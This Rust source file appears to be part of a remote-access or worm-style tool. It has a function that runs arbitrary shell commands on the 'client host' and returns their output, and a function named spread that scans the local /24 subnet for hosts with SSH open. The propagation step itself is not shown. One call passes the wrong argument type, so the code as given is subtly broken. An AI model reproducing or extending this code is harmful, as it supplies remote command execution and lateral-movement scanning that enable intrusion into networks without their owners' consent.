use std::{
    process::Command,
    io::Write,
    str,
};
use std::net::{Ipv4Addr, SocketAddr, TcpStream, ToSocketAddrs};
use std::time::Duration;
use local_ip_address::local_ip;
use ipnet::Ipv4Net;


/// Runs a terminal command at the client host
pub fn terminal_command(command: String) -> String {
    #[cfg(debug_assertions)]
    println!("Running command: {}", command);

    let mut _output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", &command])
            .output()
            .expect("Failed to execute command")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("Failed to execute command")
    };
    #[cfg(debug_assertions)]
        std::io::stdout().write_all(&_output.stdout).unwrap();

    let output_string = match str::from_utf8(&_output.stdout) {
        Ok(val) => val,
        Err(_) => "Failed parse output command"
    };
    return String::from(output_string);
}

#[derive(Debug, Clone)]
struct Port {
    pub port: u16,
    pub is_open: bool,
}

fn scan_port(ip: &String, port: u16) -> Port {
    let timeout = Duration::from_millis(100);
    let socket_address: Vec<SocketAddr> = format!("{}:{}", ip, port)
        .to_socket_addrs()
        .expect("port scanner: Creating socket address")
        .collect();
    if socket_address.is_empty() {
        return Port {
            port,
            is_open: false,
        };
    }
    let is_open = if let Ok(_) = TcpStream::connect_timeout(&socket_address[0], timeout) {
        true
    } else {
        false
    };
    Port {
        port,
        is_open,
    }
}

#[derive(Debug, Clone)]
struct NetworkHost {
    pub ip: String,
    pub open_ports: Vec<Port>,
}

fn scan_ports(mut host: NetworkHost, ports: Vec<u16>) -> NetworkHost {
    host.open_ports = ports.into_iter()
        .map(|port| scan_port(&host.ip, port))
        .filter(|port| port.is_open)
        .collect();
    host
}


pub fn spread() {
    let my_local_ip = local_ip().unwrap();
    println!("{}", my_local_ip);
    let net: Ipv4Net = format!("{}/24", my_local_ip)
        .parse()
        .unwrap();
    let ports: Vec<u16> = vec![22];
    let hosts: Vec<NetworkHost> = net.hosts()
        .collect::<Vec<Ipv4Addr>>()
        .into_iter()
        .map(|ip| NetworkHost { ip: ip.to_string(), open_ports: Vec::new() })
        //
        .map(|host| scan_ports(host, &ports))
        .filter(|host| !host.open_ports.is_empty())
        .collect::<Vec<NetworkHost>>();

    for h in hosts {
        println!("{}", h.ip);
    }
}